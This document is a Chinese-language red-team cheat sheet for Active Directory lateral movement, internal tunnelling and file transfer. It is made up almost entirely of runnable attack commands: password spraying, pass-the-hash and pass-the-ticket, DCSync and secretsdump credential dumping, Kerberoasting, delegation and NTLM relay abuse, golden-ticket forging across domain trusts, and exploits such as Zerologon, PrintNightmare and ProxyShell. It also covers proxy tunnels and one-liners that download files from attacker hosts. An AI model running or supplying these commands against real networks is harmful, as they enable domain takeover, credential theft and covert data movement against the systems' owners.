# Lateral_Movement

时间同步，dns解析，spn(创建，扫描，删除)

<br>

SID枚举/RID枚举，域用户名枚举，密码喷洒，密码/Hash碰撞，定位域控/用户/管理员，PTK&PTH&PTT，TGT&ST，票据转换，滥用dcsync，AS-REP Roasting，Kerberoasting，委派(非约束性委派，约束性委派，基于资源的约束性委派)，NTLM Relay(捕获，触发，破解，中继)，域林渗透

<br>

MS14-068 权限提升漏洞，CVE-2020-1472 NetLogon权限提升漏洞，CVE-2019-1040 ，NTLM MIC绕过漏洞(需要存在exchange服务器，或多台域控)，Print Spooler 权限提升漏洞，CVE-2021-42287/42278 权限提升漏洞，Exchange ProxyLogon 攻击利用链，Exchange ProxyShell 攻击利用链，kerberos中继

<br>

[TOC]

#### 时间同步

```
ntpdate 192.168.10.5 #通过ntp协议(ntp(123))

net time -S 192.168.10.5 #通过smb协议(135,445)
```

#### dns解析

```
sed -i '1i192.168.12.5 two.com' /etc/hosts

sed -i '1i192.168.12.5 DC.two.com' /etc/hosts
```

#### spn(创建，扫描，删除)

```
setspn -A xxx/DC.two.com:5555 win2019

powerview : Set-DomainObject -Identity "win2019" -Append "serviceprincipalname=will/DC.two.com:6789"



setspn -T two.com -q */*

powerview : Get-DomainUser -SPN -Select 'cn,distinguishedName,servicePrincipalName' -TableView

powerview : Get-DomainComputer -SPN -Select 'cn,distinguishedName,servicePrincipalName' -TableView



setspn -D xxx/DC.two.com:5555 win2019

powerview : Set-DomainObject -Identity "win2019" -Remove "serviceprincipalname=will/DC.two.com:6789"
```

#### SID枚举/RID枚举

```
impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\samr]' samr操作数枚举

impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\lsarpc]' lsarpc操作数枚举



impacket-samrdump two.com/win2019:'root'@192.168.12.5 #samr

impacket-lookupsid two.com/win2019:'root'@192.168.12.5 #lsarpc



nxc smb 192.168.12.5 192.168.12.5 -u win2019 -p root --rid-brute



enum4linux-ng -u win2019 -p root 192.168.12.5 -U -R

rpcclient $> enumdomains ; lookupdomain ; lookupsids ; lookupsids S-1-5-21-873118422-227618334-1429070027-1000/1001/1002 ; lookupnames win2019
```

#### 域用户名枚举

```
metasploit : use auxiliary/gather/kerberos_enumusers

set domain two.com

set rhosts 192.168.12.5

set user_file users.txt



kerbrute : ./kerbrute userenum --dc 192.168.12.5 -d two.com users.txt
```

#### 密码喷洒

```
metasploit : use scanner/smb/smb_login

set domain two.com

set rhosts 192.168.12.5

set user_file users.txt

set smbpass 1qaz@WSX



nxc smb 192.168.12.5 -u users.txt -p '1qaz@WSX' --continue-on-success



kerbrute : ./kerbrute passwordspray --dc 192.168.12.5 -d two.com users.txt "1qaz@WSX"
```

#### 密码/Hash碰撞

```
metasploit(psexec)

use exploit/windows/smb/psexec

set smbdomain two.com

set smbuser administrator

set rhosts 192.168.12.0/24

set payload windows/meterpreter/bind_tcp

set lport 5555



set smbpass 1qaz@WSX #密码碰撞

set smbpass aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 #Hash碰撞



nxc

nxc smb 192.168.12.5/24 -u administrator -p 1qaz@WSX #密码碰撞

nxc smb 192.168.12.0/24 -u administrator --hash aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 #Hash碰撞
```

#### 定位域控/用户/管理员

```
net time /domain #定位域控



use post/windows/gather/enum_domain #定位域控

set session 1



https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon

PsLoggedon.exe /accepteula \\192.168.12.5



nxc smb 192.168.12.0/24 -u administrator -p 1qaz@WSX --loggedon-users
```

#### PTK&PTH&PTT #localgroup只有administrator用户可远程访问，dc不受影响

###### metasploit(psexec)

```
use exploit/windows/smb/psexec

set smbdomain two.com

set smbuser win2019

set rhosts 192.168.12.5

set payload windows/meterpreter/bind_tcp

set lport 5555



set smbpass root #PTK



set smbpass 00000000000000000000000000000000:329153f560eb329c0e1deea55e88a1e9 #PTH

```

###### impacket(psexec,smbexec,wmiexec,dcomexec,atexec)

```
impacket-psexec -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 #PTK



impacket-psexec -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 #PTH



export KRB5CCNAME=win2019@192.168.12.5.ccache #PTT

impacket-psexec -dc-ip 192.168.12.5 DC.two.com -no-pass -k
```

###### nxc(smb,wmi,winrm,ldap)

```
nxc smb 192.168.12.5 -u win2019 -p root -x 'whoami' #PTK



nxc smb 192.168.12.5 -u win2019 --hash 00000000000000000000000000000000:329153f560eb329c0e1deea55e88a1e9 -x 'whoami' #PTH



export KRB5CCNAME=win2019@192.168.12.5.ccache #PTT

nxc smb 192.168.12.5 --use-kcache -x 'whoami'
```

###### evil-winrm

```
evil-winrm -i 192.168.12.5 -u win2019 -p root #PTK



evil-winrm -i 192.168.12.5 -u win2019 -H 329153f560eb329c0e1deea55e88a1e9 #PTH
```

###### mimikatz

```
privilege::debug

sekurlsa::logonpasswords #PTH

sekurlsa::pth /user:win2019 /domain:two.com /ntlm:329153f560eb329c0e1deea55e88a1e9 /run:cmd.exe



kerberos::purge #PTT

kerberos::ptt xxx.kirbi

kerberos::list
```

#### TGT&ST

###### impacket

```
impacket-getTGT -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 #TGT #PTK

impacket-getTGT -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 #TGT #PTK



impacket-getST -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 -spn cifs/DC.two.com #ST #PTK

impacket-getST -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 -spn cifs/DC.two.com #ST #PTH

export KRB5CCNAME=win2019@192.168.12.5.ccache #ST #PTT

impacket-getST -dc-ip 192.168.12.5 two.com/win2019 -no-pass -k -spn cifs/DC.two.com
```

###### mimikatz

```
privilege::debug

kerberos::list /export /target:krbtgt #TGT

kerberos::list /export /target:cifs #ST

kerberos::list /export #TGT&ST

sekurlsa::tickets /export #kerberos+localgroup
```

#### 票据转换

```
impacket-ticketConverter admin.kirbi admin.cache
```

#### 滥用dcsync

Administrators 组，Domain Admins 组，Enterprise Admins 组，具有DS-Replication-Get-Changes权限/具有DS-Replication-Get-ChangesAll权限。

###### 添加/查询/删除dcsync

```
Get-DomainObjectAcl -Where 'ObjectAceType contains DS-Replication-Get-Changes' -Select 'SecurityIdentifier,ObjectDN,AccessMask,ObjectAceType' -TableView  #查询包含dcsync权限的账户

Add-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #赋予指定账户DCSync权限

Remove-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #删除指定账户DCSync权限
```

###### 获取dcsync

```
impacket-secretsdump -dc-ip 192.168.12.5 two.com/john:"1qaz@WSX"@192.168.12.5

lsadump::dcsync /domain:two.com /all /csv
```

#### AS-REP Roasting(开启"不要求Kerberos预身份验证")

```
metasploit : use auxiliary/gather/asrep

set ldapdomain two.com

set rhosts 192.168.12.5

set user_file users.txt



impacket : impacket-GetNPUsers -dc-ip 192.168.12.5 two.com/ -usersfile users.txt -format john



hashcat -m 18200 hash.hash pass.txt --potfile-disable

john hash.hash --format=krb5asrep --wordlist=pass.txt --pot=hash.pot
```

#### Kerberoasting(需要域用户身份凭证，需要"不要求Kerberos预身份验证"用户名和一组用户名)

###### 需要域用户身份凭证

```
metasploit : use auxiliary/gather/kerberoast (hashcat)

set ldapdomain two.com

set rhosts 192.168.12.5

set ldapusername hack

set ldappassword 1qaz@WSX



impacket : impacket-GetUserSPNs -dc-ip 192.168.12.5 two.com/win2019:root -request
```

###### 需要"不要求Kerberos预身份验证"用户名和一组用户名

```
impacket-GetUserSPNs -dc-ip 192.168.10.5 two.com/ -usersfile users.txt -no-preauth hack -request

hashcat -m 13100 hash.hash pass.txt --potfile-disable

john hash.hash --format=krb5tgs --wordlist=pass.txt --pot=hash.pot
```

#### 委派(非约束性委派，约束性委派，基于资源的约束性委派)

###### 委派查询(主机账户/服务账户)

```
powerview : powerview two.com/win2019:root@192.168.12.5

Get-DomainComputer -Unconstrained #非约束性委派(主机账户)

Get-DomainUser -Unconstrained #非约束性委派(服务账户)



Get-DomainComputer -TrustedToAuth #约束性委派(主机账户)

Get-DomainUser -TrustedToAuth #约束性委派(服务账户)



Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" #基于资源的约束性委派(主机账户/服务账户)

Get-DomainObject -Identity "krbtgt" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

impacket : impacket-findDelegation two.com/win2019:root
```

###### 非约束性委派(需要一个域内账号，以及一个开启非约束性委派的域内主机权限)

```
github.com/ntfndOfficial/ActiveDirectoryTools

github.com/leechristensen/SpoolSample



Rubeus.exe monitor /interval:1 /filteruser:DC$ #域内主机本地管理员运行(监听来自DC打印机的回应)



SpoolSample.exe DC w2016-2 #域用户运行(强制要求DC打印机发起请求)



cat base64_file | tr -d ' \n'

Rubeus.exe ptt /ticket:base64



privilege::debug #获取并导入dc.kirbi

sekurlsa::tickets /export

kerberos::ptt [0;3308f]-2-0-60a10000-DC$@krbtgt-TWO.COM.kirbi



privilege::debug

lsadump::dcsync /domain:two.com /all /csv
```

###### 约束性委派(需要一个域用户，以及该域用户拥有委派DC的约束委派)

```
impacket-getST -dc-ip 192.168.12.5 two.com/hack:"1qaz@WSX" -spn cifs/DC.two.com -impersonate administrator -force-forwardable



impacket-secretsdump -dc-ip 192.168.12.5 DC.two.com -no-pass -k
```

###### 基于资源的约束性委派(需要一个域内用户，以及他可以修改msDS-AllowedToActOnBehalfOfOtherIdentity的域内主机)

```
impacket-addcomputer -dc-ip 192.168.12.5 two.com/win2019:root -computer-name "hack_machine$" -computer-pass 1qaz@WSX #添加机器用户hack_machine$



impacket-rbcd -dc-ip 192.168.12.5 two.com/win2019:root -action write -delegate-to "w2016-2$" -delegate-from "hack_machine$" #写入机器用户hack_machine$到目标域内机器w2016-2$的基于资源的约束性委派



impacket-getST -dc-ip 192.168.12.5 two.com/hack_machine$:"1qaz@WSX" -spn cifs/w2016-2.two.com -impersonate administrator [-force-forwardable] #获取伪造ST



sed -i '1i192.168.12.134 w2016-2.two.com' /etc/hosts



impacket-wmiexec -dc-ip 192.168.12.5 w2016-2.two.com -no-pass -k

*[-force-forwardable] #强制使通过S4USelf获得的服务票据进行转发，允许绕过受保护的用户(即Protected Users组内用户)，允许绕过仅使用Kerberos的受限委派限制 #CVE-2020-17049
```

#### NTLM Relay(捕获，触发，破解，中继)

###### 捕获Net-NTLM Hash

```
responder -I eth0
```

###### 触发Net-NTLM认证

```
smb

dir \\192.168.12.130\guest



http

http://192.168.12.130/guest #大部分浏览器需主动输入用户名和密码

 \#大部分浏览器需主动输入用户名和密码



scf

[shell]

Command=2

IconFile=\\192.168.12.130\guest

[Taskbar]

Command=Explorer
```

###### 破解Net-NTLM(v2)

```
hashcat -m 5600 hash passwd.txt --potfile-disable

john hash -format=netntlmv2 -wordlist=passwd.txt --pot=1.pot
```

###### 中继Net-NTLM Hash(工作组/域)(本地管理员，域管理员)

```
\#查看smb签名(只有未签名的主机才能作为被中继主机)

python /usr/share/responder/tools/RunFinger.py -i 192.168.10.1/24



smb->smb

impacket-ntlmrelayx -t smb://192.168.12.134 -c whoami -smb2support

dir \\192.168.12.130\guest



smb->ldap/http

impacket-ntlmrelayx -t ldap://192.168.12.5 -c whoami -smb2support --remove-mic

impacket-ntlmrelayx -t http://192.168.12.5 -c whoami -smb2support --remove-mic

dir \\192.168.12.130\guest



http->ldap(需明文用户&明文密码)

impacket-ntlmrelayx -t ldap://192.168.12.5 -c whoami -smb2support --remove-mic

http://192.168.12.130/guest
```

#### 域林渗透

```
inter-realm_key+SID_history

需求 : rc4_hmac_nt_hash，son_domain_sid，domain_Enterprise_Admins_sid

mimikatz.exe "privilege::debug" "lsadump::trust" /patch" "exit" #获得rc4_hmac_nt_hash



impacket-ticketer administrator -nthash rc4_hmac_nt_hash -domain-sid son_domain_sid -extra-sid domain_Enterprise_Admins_sid -domain son.domain.com -spn krbtgt/domain.com #伪造domain_gold_ticket



删除补丁

wusa /uninstall /kb:5023774
```

#### MS14-068 权限提升漏洞

```
影响版本 : 

Windows Server 2003

Windows Vista

Windows Server 2008

Windows 7

Windows 8 and Windows 8.1

Windows Server 2012（以上系列的部分版本）

补丁 : KB3011780

利用 : 

mimikatz : 

https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

MS14-068.exe -u 用户名@域 -p 用户密码 -s 用户SID -d DC的IP

kerberos::purge

kerberos::ptc TGT_xxx@xxx.ccache



impacket : 

impacket-goldenPac -dc-ip 192.168.12.5 two.com/john:"1qaz@WSX"@192.168.12.5
```

#### CVE-2020-1472 NetLogon权限提升漏洞

```
影响版本 :

Windows Server 2008 R2 for x64-based Systems Service Pack 1

Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)

Windows Server 2012

Windows Server 2012 (Server Core installation)

Windows Server 2012 R2

Windows Server 2012 R2 (Server Core installation)

Windows Server 2016

Windows Server 2016 (Server Core installation)

Windows Server 2019

Windows Server 2019 (Server Core installation)

Windows Server, version 1903 (Server Core installation)

Windows Server, version 1909 (Server Core installation)

Windows Server, version 2004 (Server Core installation)

利用 :

https://github.com/SecuraBV/CVE-2020-1472 : zerologon_tester

python3 zerologon_tester.py DC 192.168.1.53

https://github.com/risksense/zerologon : zerologon

python3 set_empty_pw.py DC 192.168.1.53 #将域控密码置空



impacket-secretsdump troila.com/dc\$@192.168.1.53 –no-pass
```

#### CVE-2019-1040 NTLM MIC绕过漏洞(需要存在exchange服务器，或多台域控)

```
影响版本 : (Windwos 7 SP 1 至 Windows 10 1903，Windows Server 2008 至 Windows Server 2019)

利用 :

impacket-ntlmrelayx --escalate-user hack -t ldap://域控_ip -smb2support --no-dump  --remove-mic #中继成功赋予hack DCSync 权限

https://github.com/dirkjanm/krbrelayx

python3 printerbug.py hack/hack:Admin123@exchange服务器_ip 攻击者_ip #攻击exchange服务器
```

#### Print Spooler 权限提升漏洞

```
影响版本 : 

windows 7

windows 8.1

windows Server 2008

windows Server 2012

windows Server 2016

windows Server 2019

windows 10

利用 :

rpcdump.py @IP | egrep 'MS-RPRN|MS-PAR'

search print spooler

getsystem

exploit/windows/dcerpc/cve_2021_1675_printnightmare
```

#### ADCS 攻击

```

```

#### CVE-2021-42287/42278 权限提升漏洞

```
https://github.com/safebuffer/sam-the-admin

python3 sam_the_admin.py "redteam/root:Red12345" -dc-ip 10.0.0.12 -shell
```

#### Exchange ProxyLogon 攻击利用链

```
影响版本 : 

Microsoft Exchange Server 2013 低于 15.00.1497.012 的版本

Microsoft Exchange Server 2016 低于 15.01.2106.013 的版本

Microsoft Exchange Server 2019 低于 15.02.0721.013 的版本

Microsoft Exchange Server 2019 低于 15.02.0792.010 的版本

利用 :

auxiliary/scanner/http/exchange_proxylogon

exploit/windows/http/exchange_proxylogon_rce
```

#### Exchange ProxyShell 攻击利用链

```
影响版本 : 

Microsoft Exchange Server 2013 Cumulative Update 23 及更早版本

Microsoft Exchange Server 2016 Cumulative Update 19、20 及更早版本 

Microsoft Exchange Server 2019 Cumulative Update 8、9 及更早版本

利用 :

exploit/windows/http/exchange_proxyshell_rce
```

#### kerberos中继

```
https://github.com/cube0x0/KrbRelay?tab=readme-ov-file

项目需要bulid

krbrelay.exe -ntlm -session 1 -clsid "354ff91b-5e49-4bdc-a8e6-1cb6c6877182" 

其中session 通过powershell qwinsta获得
```







# 内网隧道技术(portfwd,autoroute,chisel,earthworm,iox,frp,ssh,neo-regeorg,pingtunnel,6tunnel)



## 强制代理工具

proxifier

proxychains

------

## portfwd

```
portfwd add -L 192.168.163.131 -l 9090 -r 192.168.163.1 -p 80 

\#正向端口转发 将192.168.163.1:80映射到 192.168.163.131:9090上 -L 默认0.0.0.0

\#可能会导致线路卡住（实验性使用）

portfwd add -R -L 192.168.49.129 -l 1000 -p 111 

\#反向端口转发 中转机器监听自身，自身端口111收到消息，传递到 192.168.49.129:1000

portfwd add -R -L 192.168.11.130 -l 22 -p 111

ssh centos7-2@192.168.49.131 -p 111 

\#中转机监听自身，自身端口111收到消息，传递到192.168.11.130:22端口

这里的-L 可以是kali外网的主机，也可以是中转机内网的主机
```

------

## autoroute

```
run autoroute -s /[mask]  mask default 255.255.255.255.0

run autoroute -p 查看面板

run autoroute -d -s  删除目标proxy

example:

run autoroute -s 192.168.11.1/24

auxiliary/server/socks_proxy

\#将msfconsole的 proxy 实现到本地

proxychains <...>
```

------

## chisel[http]

```
正向端口转发

centos7-1 : ./chisel server -p 12345

kali : chisel.exe client cen_ip:12345 0.0.0.0:11111:127.0.0.1:22222

1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问

2 . centos7-1 架设chisel server 开放端口 12345

3 . kali 架设chisel chilent 连接 cen_ip:12345 将centos7-1 的127.0.0.1:22222 映射到kali的11111端口 

4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口

反向端口转发

kali : ./chisel server -p 12345 --reverse

centos7-1 : ./chisel client kali_ip:12345 R:11111:127.0.0.1:22222

1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问

2 . kali 架设chisel server 开放端口 12345 启用反向连接

3. centos7-1 架设chilent 连接 kali_ip:12345 将centos7-1自身的127.0.0.1:22222 反向映射到kali的11111端口

4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口

socks5正向代理

centos7-1 : ./chisel server -p 12345 --socks5

kali : ./chisel client cen_ip:12345 socks

1 . 通过centos7-1作为跳板机

2 . centos7-1 运行 chisel server 开放端口12345 使用socks5

3 . kali 运行 chisel client client 连接 cen_ip:13245 使用socks启用socks5代理

socks5反向代理

kali : ./chisel server -p 12345 --reverse --socks5

centos7-1 : ./chisel client kali_ip:12345 R:socks

1 . 通过centos7-1作为跳板机

2 . kali 运行 chisel server 开放端口12345 启用反向连接，启用socks5

3 . centos7-1 运行 chisel client 连接 kali_ip:12345 使用socks启用socks5代理
```

------

## earthworm(socks5隧道)

```
ssocksd… >--o -l 正向sock

rssocks… <--o -d -e 反向sock

lcx_listen/rcsocks… >-< -l -e

lcx_slave… <-> -d -e -f -g

proxychains… -->
```

------

## ssh

```
kali: 192.168.10.132

centos7: 192.168.10.147 192.168.11.174

centos7-2: 192.168.11.173

ssh sock代理

ssh -D 8800 centos7@192.168.10.147

\#在kali上通过centos7建立本地8800对centos7的sock代理，流量通过kali本地8800流经centos7前往内网

ssh端口转发

(正向)(kali上执行命令)

kali: ssh -L 12345:127.0.0.1:22 centos7@192.168.10.147

\#通过centos7连接到centos7本地，并将centos7的22端口映射为kali本地端口12345

kali: ssh -L 1234:192.168.11.173:22 centos7@192.168.10.147

\#通过centos7连接到centos7-2，并将centos7-2的22端口映射为kali本地端口1234

(反向)(中转机centos7上执行命令)

centos7: ssh -R 4321:127.0.0.1:22 kali@192.168.10.132

\#在中转机centos7上执行命令将kali的4321端口映射为centos7本地的22端口

centos7: ssh -R 54321:192.168.11.173:22 kali@192.168.10.132

\#在中转机centos7上执行命令将kali的54321端口映射为centos7-2的22端口

ssh跳板连接

ssh -J centos7@192.168.10.147 centos7-2@192.168.11.173 

\#通过centos7的ssh连接到centos7-2的ssh
```

------

## iox

```
优点 多级转发方便 可加密

端口转发

\#监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发

./iox fwd -l 8888 -l 9999 相当于 ew -s lcx_listen

\#监听0.0.0.0:8888，把流量转发到1.1.1.1:9999

./iox fwd -l 8888 -r 1.1.1.1:9999 相当于ew -s lcx_tran

\#连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发

./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999 相当于ew -s lcx_slave

正向socks5代理

centos7-1 : ./iox proxy -l 12345

\#本地开启socks5代理 开放端口 12345

反向socks5代理

kali : ./iox proxy -l 2345 -l 2346 #此处2345是远程回连端 2346是本地入口

centos7-1 : ./iox proxy -r kali_ip:2345

加密 : kali 仅开始输出端不能加密，输入端可加密

二层正向socks5代理

kali : ./iox fwd -l 2345 -l *2346 -k 123456

centos7-1 : ./iox fwd -r *kali_ip:2346 -r *centos7-2_ip:12345 -k 123456 

centos7-2 : ./iox proxy -l *12345 123456

\#kali 开启 本地端口转发 将 2345 监听到的信息转发到 2346

\#centos7-1 开启端口转发 连接 kali_ip:2346 和 centos7-2_ip:12345

\#centos7-2 开启本地socks5 代理 监听本地端口 12345

二层反向socks5代理

kali : ./iox proxy -l *2346 -l 2345 -k 123456

centos7-1 : ./iox fwd -l *5678 -r *kali_ip:2346 -k 123456

centos7-2 : ./iox proxy -r *centos7-1_ip:5678 123456

kali 开启本地socks5转发

centos 7-1 开启端口转发 监听 5678 转发到 kali_ip:2346

centos 7-2 开启反向socks5 连接centos7-1的 5678端口
```

------

## frp

```
弊端：增加了一个文件 frpc.toml 

socks5代理

kali : ./frps -p 8888

centos7-1 : frpc -c frpc.toml

frpc.toml

""""""""""""""""""""

serverAddr = "192.168.12.130"

serverPort = 8888

[[proxies]]

name = "test1"

type = "tcp"

remotePort = 6000

[proxies.plugin]

type = "socks5"

""""""""""""""""""""

kali 本地建立frps 服务器，监听本地端口8888

centos7-1 连接kali_ip kali_port 开启socks5 并映射使用kali本地6000通信
```

------

## neo-regeorg(http隧道)

```
python neoreg.py generate -k passwd 生成带密码的一系列tunnel文件

将文件上传至靶机网站目录

python neoreg.py -u http://..../tunnel.php -p 9999 -k passwd #开启socks5服务开放本地端口9999连接远程web服务器

将本地proxychains文件修改为127.0.0.1 9999
```

------

## pingtunnel(icmp隧道)  #需要root权限

```
pingtunnel(仅仅linux可以使用,且为root权限,windows测试使用失败)

socks5代理

centos7: ./pingtunnel -type server -noprint 1 -nolog 1

kali: ./pingtunnel -type client -l 0.0.0.0:1080 -s 192.168.10.147 -sock5 1 -noprint 1

端口转发

centos7-1 : ./pingtunnel -type server -noprint 1 -nolog 1

kali : ./pingtunnel -type client -l 0.0.0.0:1234 -s 192.168.12.131 -t 192.168.11.133:8000 -tcp 1 -noprint 1 -nolog 1  #端口转发 
```

------

## 6tunnel

```
6tunnel -4 7777 fe80::5b33:115b:ce91:1d37%eth0 22

\#建立端口转发,将fe80::5b33:115b:ce91:1d37的22端口映射到kali本地7777端口，使用ipv6通信
```

# 上传下载,服务建立,压缩解压缩,提升交互性,查找(文件,内容)

#### 上传下载

###### certutil

certutil.exe -urlcache -split -f http://192.168.1.192/file.txt file.txt 

###### bitsadmin

bitsadmin /rawreturn /transfer down "https://www.baidu.com/robots.txt" c:\robots.txt #c:\robots.txt 必须是绝对路径

###### vbs

++++++++++++++++++++++++++++++

Set Post = CreateObject("Msxml2.XMLHTTP") 

Set Shell = CreateObject("Wscript.Shell")

Post.Open "GET","http://192.168.11.131:8000/test.txt",0

Post.Send()

Set aGet = CreateObject("ADODB.Stream")

aGet.Mode = 3

aGet.Type = 1

aGet.Open()

aGet.Write(Post.responseBody)

aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2

++++++++++++++++++++++++++++++

echo 'Set Post = CreateObject("Msxml2.XMLHTTP"):Set Shell = CreateObject("Wscript.Shell"):Post.Open "GET","http://192.168.11.131:8000/test.txt",0:Post.Send():Set aGet = CreateObject("ADODB.Stream"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2' > download.vbs ; .\download.vbs ; sleep 1 ; del download.vbs

###### wget(powershell)

wget http://192.168.163.131/pass -o pass

###### nc

nc -lvnp 443 < pass

.\nc.exe 192.168.163.131 443 > pass1

###### scp

scp kali@192.168.163.131:/home/kali/main_box/pass pass1

scp pass1 kali@192.168.163.131:/home/kali/pass4

\#和ssh登录一样

-r 递归目录复制

scp -r kali@192.168.163.131:/home/kali/main_box/1 3 #将目录1重命名为3

###### curl

curl http://xxxxx/xxx -o xxx

curl.exe -X POST http://127.0.0.1:8000/upload -F "files=@c:/..." #上传(需要远程http可写)

###### metasploit

download xxx xxx

upload xxx xxx

###### Invoke-WebRequest

Invoke-WebRequest URL -o"本地保存路径"

wget curl 别名

------

#### 服务建立

###### http

python -m http.server 8000

python2 -m SimpleHTTPServer 8000

python3 -m uploadserver 8000 --allow-replace #可写的http

php -S 0:8000 #如果从浏览器访问需要index.php

ruby -run -e httpd . -p 8000

jwebserver -b 0.0.0.0 -p 8000 #java

miniserve -p 8000 . #rust

npx http-server -p 8000 #nodejs

###### smb

impacket-smbserver guest . -smb2support

impacket-smbserver guest . -username admin -password passwd -smb2support

impacket-smbclient anonymous@192.168.12.130 -no-pass

impacket-smbclient admin:passwd@192.168.12.130 -no-pass

###### tcp

nc -lvnp 443 < 123.txt

nc xxx.xxx.xxx.xxx 443 > 321.txt

###### ftp

python -m pyftpdlib -p 21

------

#### 压缩解压缩

gz bz2 xz 不支持多文件

zip rar 7z 支持单文件，多文件，目录结构

tar 支持打包多文件，目录结构

makecab&cabextract

compress-archive&expand-archive

------

###### gz

gzip 1.txt          #不留存 -k留存

-l 查看文件内容

gzip -d 1.txt.gz     

------

###### bz2

bzip2 1.txt

-l 查看文件内容

bzip2 -d 1.txt.bz2

------

###### xz

xz 1.txt

-l 查看文件内容

xz -d 1.txt.xz

------

###### tar

tar -czvf 1.tar.gz 1 

-cjvf 1.tar.bz2 1

-cJvf 1.tar.xz 1

-xzvf 1.tar.gz

-xjvf 1.tar.bz2

-xJvf 1.tar.xz -C /path/                   -C 解压到对应目录

-tf 查看文件内容

tar -cvf archive.tar file1.txt file2.txt mu 打包多个文件 其中mu是目录

------

###### zip

zip 1.zip 1

zip -d 1.zip    #留存源文件  -m不留存

unzip 1.zip      

unzip -l 1.zip 查看1.zip 内容

zip -r main.zip 1.txt 2.txt mu                     #其中mu是目录 -r 保留目录结构

zip -r -s 10m main.zip *    -s 10m 分卷压缩 每一卷10mb          解压缩时用7z解压缩

zip -e -P "123" 1.txt.zip 1.txt     -e 设置密码，-P 静默输入密码，但会留存记录

------

###### rar

rar a 1.rar 1

rar x 1.rar

rar l 1.rar 查看1.rar的内容

-m0最快压缩    -m5 最大压缩率

-v20m 分卷压缩，每卷20m m=MB, k=KB, g=GB

-p12345 密码 可用" "括起来,\"代表字符"

rar a -p12345 -m0 -v20m 1.rar 1

------

###### 7z

7z -l 列出其中的内容

7z a -p12345 1.7z 1

7z x 1.7z

-mx=0 -mx=5 -mx=9   0仅仅存储，5正常默认，9最大压缩

-v100m   分卷压缩

-pPassword  加密

------

###### makecab&cabextract

.cab[单文件]

makecab

mackcab 1.txt 1.cab

expand rar.cab rar.exe

cabextract

cabextract 1.cab / 7z x 1.cab

------

###### compress-archive&expand-archive

compress-archive 123.jpg 123.zip

compress-archive 文件夹 文件夹.zip

expand-archive 123.zip 123.jpg

expand-archive 文件夹 文件夹.zip

------

#### 提升交互性

RunasCs.exe one one -l 8 "cmd /c whoami"

python -c "import pty;pty.spawn('/bin/bash')"

stty raw -echo

export TERM=xterm-color

rlwrap -cAr 

------

#### 查找文件(文件,内容)

###### windows

(cmd)

dir /s /i ".\*passw*" #查找带passw字样的 目录和文件名

findstr /s /i /n /c:"passw" /c:"secu" c:\users\qwe2\desktop\*.txt c:\users\qwe2\desktop\*.docx #查找带passw/secu字样的文件内容的 行   /s 递归 /i 不区分大小写 /n 带行号 /r 正则匹配 /c 匹配词 *.* / *.txt

(powershell)

gci -Path . -Recurse -Force | ? { $_.Name -like "*passw*" } #查找带passw字样的 目录和文件名

gci -Path . -recurse | ? {$_.name -like "*.txt" } | sls -Pattern "passw" #递归查找txt文件中包含passw字样的 行

###### linux

find /tmp/. -iname "*passw*" #查找带passw字样的 目录和文件名

grep -ir "pass" . #查找带passw的文件内容的 行